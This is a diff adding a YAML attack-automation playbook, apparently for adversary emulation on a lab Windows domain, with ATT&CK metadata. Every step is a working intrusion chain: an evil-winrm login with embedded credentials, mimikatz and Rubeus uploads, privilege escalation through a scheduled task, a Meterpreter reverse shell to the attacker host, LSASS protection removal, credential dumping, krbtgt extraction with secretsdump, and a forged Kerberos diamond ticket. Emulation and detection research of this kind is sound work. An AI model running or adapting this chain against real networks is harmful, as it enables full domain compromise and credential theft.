@@ -1,0 +1,215 @@
+vars:
+  TARGET: 10.10.10.10
+  ATTACKER: 10.10.10.200
+  USER: Alice
+  DOMAIN: aecid-testbed.com
+  PASSWORD: Pa$$w0rd
+  PAYLOADS: /home/superuser/payloads
+  PAYLOAD: "windows/x64/meterpreter/reverse_tcp"
+  DOMADM: "wsadmin"
+  DOMADMPW: "Root.PW1"
+  DOMDC: 10.0.0.10
+  DOMHOST: dc1.aecid-testbed.com
+
+commands:
+  - type: shell
+    cmd: "evil-winrm -i $TARGET -u $USER -p '$PASSWORD'\n"
+    command_timeout: 30
+    interactive: true
+    creates_session: winrm
+    metadata:
+      techniques: "T1590.002,T1591"
+      tactics: "Reconnaissance"
+      technique_name: "Gather Victim Network Information: DNS,Gather Victim Org Information"
+
+  - type: shell
+    session: winrm
+    cmd: "mkdir C:\\\\Temp\n"
+    interactive: true
+
+  - type: shell
+    session: winrm
+    cmd: "upload $PAYLOADS/Rubeus.exe C:\\\\Temp\\\\Rubeus.exe\n"
+    interactive: true
+
+  - type: shell
+    session: winrm
+    cmd: "upload $PAYLOADS/mimidrv.sys C:\\\\Temp\\\\mimidrv.sys\n"
+    interactive: true
+
+  - type: shell
+    session: winrm
+    cmd: "upload $PAYLOADS/mimikatz.exe C:\\\\Temp\\\\mimikatz.exe\n"
+    interactive: true
+
+  - type: shell
+    session: winrm
+    cmd: "upload $PAYLOADS/mimilib.dll C:\\\\Temp\\\\mimilib.dll\n"
+    interactive: true
+
+  - type: shell
+    session: winrm
+    cmd: "upload $PAYLOADS/mimispool.dll C:\\\\Temp\\\\mimispool.dll\n"
+    interactive: true
+
+  - type: shell
+    session: winrm
+    cmd: "Set-Content -Path C:\\\\ProgramData\\\\WriteLog.ps1 -Value 'net localgroup administrators Alice /add'\n"
+    interactive: true
+
+  - type: shell
+    session: winrm
+    cmd: "schtasks /run /tn WriteLog\n"
+    interactive: true
+
+  - type: msf-payload
+    cmd: $PAYLOAD
+    payload_options:
+        LHOST: $ATTACKER
+        LPORT: "9001"
+    format: exe
+    local_path: $PAYLOADS/msf.exe
+
+  - type: shell
+    session: winrm
+    cmd: "upload $PAYLOADS/msf.exe C:\\\\Temp\\\\msf.exe\n"
+    interactive: true
+
+  - type: msf-module
+    creates_session: rshell
+    cmd: exploit/multi/handler
+    payload: $PAYLOAD
+    payload_options:
+      LHOST: $ATTACKER
+      LPORT: "9001"
+    background: true
+    kill_on_exit: true
+
+  - type: shell
+    creates_session: winrmPriv
+    command_timeout: 30
+    cmd: "evil-winrm -i $TARGET -u $USER -p '$PASSWORD'\n"
+    interactive: true
+
+  - type: shell
+    session: winrmPriv
+    cmd: "C:\\\\Temp\\\\msf.exe\n"
+    interactive: true
+
+  - type: msf-session
+    session: rshell
+    cmd: getuid
+
+  - type: msf-session
+    session: rshell
+    cmd: getsystem
+
+  - type: msf-session
+    session: rshell
+    cmd: getuid
+
+  - type: msf-session
+    session: rshell
+    cmd: load kiwi
+
+  - type: sleep
+    seconds: 5
+
+  # - type: msf-session
+  #   session: rshell
+  #   cmd: "cd C:\\\\Temp\n"
+
+  - type: msf-session
+    session: rshell
+    cmd: "kiwi_cmd \"!+\""
+
+  - type: msf-session
+    session: rshell
+    cmd: "kiwi_cmd \"privilege::debug\""
+
+  - type: msf-session
+    session: rshell
+    cmd: "kiwi_cmd '\"!processprotect /process:lsass.exe /remove\"'"
+
+  - type: sleep
+    seconds: 2
+
+  - type: msf-session
+    session: rshell
+    cmd: "kiwi_cmd \"sekurlsa::logonpasswords\""
+
+  - type: regex
+    cmd: ".*NTLM.*:(.*)"
+    output:
+      NTLM: "$MATCH_0"
+
+  - type: debug
+    cmd: "$NTLM"
+
+  - type: shell
+    cmd: "secretsdump.py $DOMAIN/'$DOMADM':'$DOMADMPW'@'$DOMDC' -just-dc"
+
+  - type: regex
+    cmd: "krbtgt:aes256.*:(.*)"
+    output:
+      KRBTGT: "$MATCH_0"
+
+  - type: debug
+    cmd: "$KRBTGT"
+
+  - type: msf-session
+    session: rshell
+    cmd: "ps"
+
+  - type: regex
+    cmd: ".*explorer*."
+    output:
+      PID: "$MATCH_0"
+
+  - type: regex
+    cmd: "(\\d+) "
+    input: PID
+    output:
+      EXPORTPID: "$MATCH_0"
+
+  - type: debug
+    cmd: "$EXPORTPID"
+
+  - type: msf-session
+    session: rshell
+    cmd: "migrate $EXPORTPID"
+
+  - type: msf-session
+    session: rshell
+    cmd: getuid
+
+  - type: msf-session
+    session: rshell
+    cmd: "execute -f C:\\\\Temp\\\\Rubeus.exe -a \"diamond /krbkey:$KRBTGT /user:$USER /password:$PASSWORD /enctype:aes /domain:$DOMAIN /dc:$DOMHOST /ticketuser:$USER /ptt /nowrap\" -i"
+
+  # - type: setvar
+  #   variable: RUB
+  #   cmd: $RESULT_STDOUT
+
+  # - type: sleep
+  #   seconds: 2
+
+  - type: regex
+    cmd: "      (\\S+)"
+  #  input: RUB
+    output:
+      RUBHASH: "$MATCH_3"
+
+  - type: debug
+    cmd: "$RUBHASH"
+
+  - type: msf-session
+    session: rshell
+    cmd: "execute -f C:\\\\Temp\\\\Rubeus.exe -a \"asktgs /ticket:$RUBHASH /service:cifs/$DOMHOST /ptt /nowrap \" -i "
+
+  - type: sleep
+    seconds: 2
+
+  - type: msf-session
+    session: rshell
+    cmd: "kerberos_ticket_list"
